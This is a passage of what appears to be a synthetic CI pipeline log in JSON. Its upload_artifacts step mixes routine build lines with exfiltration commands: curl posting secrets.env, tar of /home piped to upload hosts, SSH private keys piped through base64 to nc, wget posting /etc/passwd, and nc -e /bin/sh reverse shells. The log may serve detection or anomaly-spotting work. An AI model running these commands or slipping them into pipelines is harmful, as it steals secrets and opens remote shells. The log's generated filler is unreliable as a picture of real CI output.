(187ms)\nStep 3/10: Building\n  PASS: test_api_health (25ms)\nCache hit for key-8473\n\u2713 build completed\nStep 1/10: Building\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_api_health (473ms)\nCache hit for key-3733\n[12:00:19] INFO: Processing request\nInstalling prettier@4.13.0\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n[12:00:19] WARN: Deprecated API usage\nInstalling eslint@5.12.0\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (10ms)\nStep 6/10: Building\nStep 7/10: Building\nCache hit for key-7902\n\u2713 build completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 lint completed\nCompiling src/utils.go...\nCache hit for key-4036\nInstalling prettier@5.14.0\n[12:00:19] INFO: Processing request\nCache hit for key-1559\n  PASS: test_user_create (211ms)\nInstalling axios@3.16.0\nArtifact uploaded: build.tar.gz (32MB)\nCache hit for key-1126\n\u2717 build failed with exit code 102\nArtifact uploaded: build.tar.gz (40MB)\nArtifact uploaded: build.tar.gz (38MB)\nInstalling eslint@1.16.0\n\u2713 test completed\n[12:00:19] INFO: Processing request\n\u2713 lint completed\n=== Step integration_tests completed ===\n=== Step: setup_node ===\n\u2713 lint completed\n  PASS: test_cache_hit (483ms)\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_db_connect (105ms)\nStep 8/10: Building\nInstalling webpack@4.9.0\n  PASS: test_cache_hit (417ms)\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nFAILED: test_db_connect\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:19] INFO: Processing request\nCache hit for key-2523\nCompiling src/app.ts...\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nWARNING: eslint has known vulnerabilities\n  PASS: test_db_connect (143ms)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n[12:00:19] ERROR: Connection failed\nCompiling src/utils.go...\n  PASS: test_db_connect (108ms)\n\u2713 build completed\nCache hit for key-9312\nInstalling eslint@3.17.0\nCompiling src/app.ts...\n[12:00:19] WARN: Deprecated API usage\n\u2713 test completed\nCompiling src/app.ts...\nStep 4/10: Building\n[12:00:19] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nCache hit for key-8088\n\u2717 build failed with exit code 52\nInstalling react@3.11.0\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nCompiling src/utils.go...\nInstalling jest@5.13.0\n  PASS: test_cache_hit (143ms)\n  PASS: test_api_health (29ms)\nStep 7/10: Building\n  PASS: test_user_create (474ms)\nStep 5/10: Building\nCache hit for key-2854\nInstalling eslint@3.10.0\nCompiling src/utils.go...\n\u2713 test completed\nCache hit for key-8603\n\u2713 test completed\nCompiling src/index.js...\nCompiling src/service.java...\nCache hit for key-5827\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_auth_login (8ms)\nInstalling webpack@4.7.0\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nCompiling src/service.java...\nStep 4/10: Building\nStep 1/10: Building\n[12:00:19] INFO: Processing request\n\u2713 build completed\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_auth_login (342ms)\nInstalling jest@2.14.0\nCompiling src/index.js...\n\u2713 test completed\n  PASS: test_db_connect (298ms)\nInstalling express@4.16.0\n  PASS: test_user_create (100ms)\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (206ms)\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/utils.go...\nStep 9/10: Building\nInstalling eslint@2.19.0\nInstalling prettier@2.5.0\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: build.tar.gz (31MB)\n=== Step setup_node completed ===\n=== Step: upload_artifacts ===\ncurl -X POST https://test.io/collect -d @secrets.env\n\u2713 build completed\nSending 386MB of data to startup.dev\ncurl -X POST https://cloud.services/collect -d @secrets.env\nnc -e /bin/sh 184.68.21.23 41513\nWARNING: eslint has known vulnerabilities\nInstalling jest@2.20.0\n\u2713 lint completed\n[12:00:19] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 18.40.60.225 61062\nWARNING: react has known vulnerabilities\ncurl -X POST https://acme.corp/collect -d @secrets.env\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (14MB)\ntar czf - /home | curl -X POST -d @- https://example.com/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 163.98.175.169 6973\nInstalling express@3.15.0\nCache hit for key-5916\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nInstalling react@5.18.0\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-5762\n\u2713 test completed\nCache hit for key-3796\n  PASS: test_db_connect (470ms)\nWARNING: jest has known vulnerabilities\n\u2713 lint completed\n[12:00:19] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling react@2.10.0\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:00:19] WARN: Deprecated API usage\necho $(cat ~/.ssh/id_rsa) | base64 | nc 76.22.226.22 56445\nInstalling react@3.2.0\nStep 5/10: Building\n  PASS: test_cache_hit (273ms)\n[12:00:19] WARN: Deprecated API usage\nSending 381MB of data to cloud.services\nSending 276MB of data to cloud.services\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-7561\nWARNING: lodash has known vulnerabilities\n  PASS: test_api_health (47ms)\nStep 9/10: Building\ncurl -X POST https://example.com/collect -d @secrets.env\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nCompiling src/app.ts...\ncurl -X POST https://cloud.services/collect -d @secrets.env\n  PASS: test_auth_login (77ms)\nSending 11MB of data to acme.corp\nCache hit for key-7873\necho $(cat ~/.ssh/id_rsa) | base64 | nc 222.74.86.224 21876\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:00:19] INFO: Processing request\nSending 91MB of data to startup.dev\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-1660\nStep 1/10: Building\nSending 149MB of data to cloud.services\nInstalling lodash@1.7.0\nArtifact uploaded: build.tar.gz (11MB)\n  PASS: test_db_connect (16ms)\nStep 9/10: Building\nCache hit for key-9733\n\u2713 build completed\nArtifact uploaded: build.tar.gz (6MB)\nInstalling prettier@3.15.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/app.ts...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 13.64.177.24 53402\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nnc -e /bin/sh 103.158.119.46 20299\nArtifact uploaded: build.tar.gz (12MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 192.31.214.188 61048\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nInstalling axios@4.19.0\nCache hit for key-3362\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\nCompiling src/main.py...\nCompiling src/app.ts...\n\u2717 build failed with exit code 1\ncurl -X POST https://startup.dev/collect -d @secrets.env\nStep 1/10: Building\nInstalling react@5.3.0\nInstalling axios@3.16.0\nInstalling jest@1.5.0\nCache hit for key-7683\nCompiling src/main.py...\nWARNING: eslint has known vulnerabilities\nCompiling src/index.js...\n\u2713 lint completed\n  PASS: test_cache_hit (252ms)\nCompiling src/index.js...\nException: ValueError\n[12:00:19] INFO: Processing request\nCompiling src/service.java...\nInstalling eslint@5.12.0\n\u2713 test completed\n[12:00:19] ERROR: Connection failed\nCache hit for key-3605\nCache hit for key-5010\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\nInstalling lodash@1.3.0\n[12:00:19] INFO: Processing request\nInstalling eslint@4.0.0\n  PASS: test_user_create (359ms)\n  PASS: test_cache_hit (261ms)\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-14T12:00:19.597054",
        "finished_at": "2025-12-14T12:00:26.549900",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache hit for key-6643",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (127ms)",
          "Installing react@2.7.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] ERROR: Connection failed",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Cache hit for key-5234",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "  PASS: test_user_create (267ms)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-8289",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9107",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-8824",
          "  PASS: test_user_create (237ms)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/main.py...",
          "Installing webpack@5.9.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-6859",
          "Installing eslint@4.14.0",
          "Compiling src/app.ts...",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-7651",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-6116",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-4181",
          "  PASS: test_auth_login (400ms)",
          "Installing axios@5.7.0",
          "  PASS: test_auth_login (358ms)",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_api_health (326ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_user_create (348ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_db_connect (333ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "WARNING: lodash has known vulnerabilities",
          "Installing prettier@1.4.0",
          "  PASS: test_db_connect (482ms)",
          "Cache hit for key-5287",
          "Installing eslint@1.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 10/10: Building",
          "Cache hit for key-7770",
          "Installing lodash@1.10.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Exception: RuntimeError",
          "  PASS: test_auth_login (365ms)",
          "\u2717 build failed with exit code 80",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 104",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-14T12:00:26.549900",
        "finished_at": "2025-12-14T12:00:33.502746",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: test_auth_login (281ms)",
          "  PASS: test_auth_login (364ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:19] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing jest@1.19.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-2713",
          "Cache hit for key-1202",
          "Installing axios@4.1.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Cache hit for key-3331",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (38ms)",
          "\u2713 test completed",
          "Installing prettier@1.4.0",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:19] ERROR: Connection failed",
          "Installing express@2.12.0",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (433ms)",
          "  PASS: test_db_connect (324ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (76ms)",
          "[12:00:19] INFO: Processing request",
          "Installing express@1.18.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 3/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 1/10: Building",
          "Cache hit for key-1382",
          "Step 10/10: Building",
          "Installing express@5.2.0",
          "[12:00:19] INFO: Processing request",
          "Installing jest@5.3.0",
          "Installing eslint@5.7.0",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Cache hit for key-8708",
          "  PASS: test_db_connect (453ms)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing lodash@1.19.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2120",
          "Installing jest@3.12.0",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 8/10: Building",
          "Installing eslint@1.8.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Installing webpack@5.12.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Installing react@2.13.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing webpack@3.11.0",
          "Installing express@1.18.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_user_create (211ms)",
          "Installing prettier@2.11.0",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (54ms)",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-14T12:00:33.502746",
        "finished_at": "2025-12-14T12:00:54.361283",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_api_health (176ms)",
          "Installing prettier@4.8.0",
          "FAILED: test_db_connect",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Cache hit for key-9444",
          "  PASS: test_api_health (420ms)",
          "Installing prettier@2.15.0",
          "Cache hit for key-7030",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (73ms)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-8949",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (186ms)",
          "  PASS: test_cache_hit (20ms)",
          "  PASS: test_user_create (68ms)",
          "Compiling src/index.js...",
          "[12:00:19] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "  PASS: test_api_health (427ms)",
          "  PASS: test_auth_login (306ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing jest@5.18.0",
          "  PASS: test_api_health (46ms)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (446ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 121",
          "\u2717 build failed with exit code 56",
          "Cache hit for key-1644",
          "  PASS: test_auth_login (23ms)",
          "[12:00:19] INFO: Processing request",
          "Installing jest@3.20.0",
          "Step 8/10: Building",
          "Cache hit for key-2320",
          "  PASS: test_cache_hit (326ms)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-2957",
          "Installing lodash@3.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_user_create (27ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "Installing prettier@5.2.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Installing express@1.1.0",
          "Installing express@3.8.0",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Cache hit for key-8867",
          "[12:00:19] ERROR: Connection failed",
          "Cache hit for key-3346",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-14T12:00:54.361283",
        "finished_at": "2025-12-14T12:00:58.532990",
        "log_lines": [
          "=== Step: save_cache ===",
          "Step 6/10: Building",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "Installing eslint@5.6.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 7/10: Building",
          "Installing webpack@3.3.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/service.java...",
          "Cache hit for key-3811",
          "Cache hit for key-6960",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-8532",
          "Compiling src/utils.go...",
          "Installing prettier@2.5.0",
          "  PASS: test_auth_login (491ms)",
          "Cache hit for key-8124",
          "Cache hit for key-4104",
          "[12:00:19] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-1787",
          "Step 9/10: Building",
          "Cache hit for key-2048",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-3510",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-3393",
          "Compiling src/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Installing jest@2.4.0",
          "  PASS: test_api_health (14ms)",
          "Installing axios@4.11.0",
          "Compiling src/utils.go...",
          "Installing lodash@5.19.0",
          "Cache hit for key-2231",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (171ms)",
          "Installing jest@4.2.0",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing prettier@1.11.0",
          "Cache hit for key-5949",
          "Step 10/10: Building",
          "Cache hit for key-2037",
          "Step 3/10: Building",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6128",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (345ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_user_create (6ms)",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing jest@3.13.0",
          "[12:00:19] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-1670",
          "  PASS: test_user_create (73ms)",
          "Cache hit for key-2572",
          "Step 4/10: Building",
          "Cache hit for key-3583",
          "Cache hit for key-9794",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing webpack@4.8.0",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "FAILED: test_user_create",
          "Exception: ValueError",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-14T12:00:58.532990",
        "finished_at": "2025-12-14T12:01:05.485836",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (101ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing prettier@3.11.0",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "Installing webpack@5.14.0",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-3874",
          "  PASS: test_db_connect (352ms)",
          "Cache hit for key-4825",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@4.6.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 5/10: Building",
          "Installing axios@3.6.0",
          "Compiling src/main.py...",
          "Cache hit for key-3274",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-2760",
          "\u2713 lint completed",
          "Cache hit for key-2223",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Cache hit for key-3817",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache hit for key-5781",
          "Step 1/10: Building",
          "Installing jest@1.4.0",
          "Cache hit for key-7665",
          "WARNING: express has known vulnerabilities",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-2936",
          "Cache hit for key-6017",
          "[12:00:19] INFO: Processing request",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 1/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-7364",
          "Step 3/10: Building",
          "Installing express@1.11.0",
          "  PASS: test_db_connect (490ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "Installing lodash@4.14.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-6915",
          "[12:00:19] INFO: Processing request",
          "Installing lodash@3.7.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 6/10: Building",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-6790",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2721",
          "  PASS: test_auth_login (376ms)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (485ms)",
          "Installing lodash@5.1.0",
          "Step 2/10: Building",
          "Cache hit for key-4640",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-14T12:01:05.485836",
        "finished_at": "2025-12-14T12:01:12.438682",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u2713 build completed",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 113",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (277ms)",
          "Installing express@5.20.0",
          "Cache hit for key-5410",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Installing webpack@5.10.0",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing webpack@2.16.0",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_user_create (97ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 104",
          "Cache hit for key-9742",
          "Installing eslint@2.8.0",
          "Compiling src/utils.go...",
          "Cache hit for key-7031",
          "\u2713 lint completed",
          "  PASS: test_user_create (23ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/utils.go...",
          "Installing prettier@4.5.0",
          "Cache hit for key-1345",
          "Installing axios@1.19.0",
          "Compiling src/service.java...",
          "Installing axios@3.1.0",
          "[12:00:19] INFO: Processing request",
          "Step 7/10: Building",
          "Cache hit for key-9380",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Installing axios@3.5.0",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (244ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 build completed",
          "Cache hit for key-4146",
          "Installing eslint@4.6.0",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Installing express@1.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (96ms)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Installing axios@3.19.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:19] INFO: Processing request",
          "Installing react@2.7.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1906",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-4408",
          "\u2713 build completed",
          "  PASS: test_api_health (323ms)",
          "Installing eslint@3.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:19] WARN: Deprecated API usage",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-14T12:01:12.438682",
        "finished_at": "2025-12-14T12:01:19.391528",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2717 build failed with exit code 121",
          "Cache hit for key-9822",
          "  PASS: test_api_health (192ms)",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-8873",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing express@1.1.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing express@1.2.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-4100",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Exception: TypeError",
          "Cache hit for key-5866",
          "Installing axios@3.8.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Exception: ValueError",
          "Step 4/10: Building",
          "\u2713 test completed",
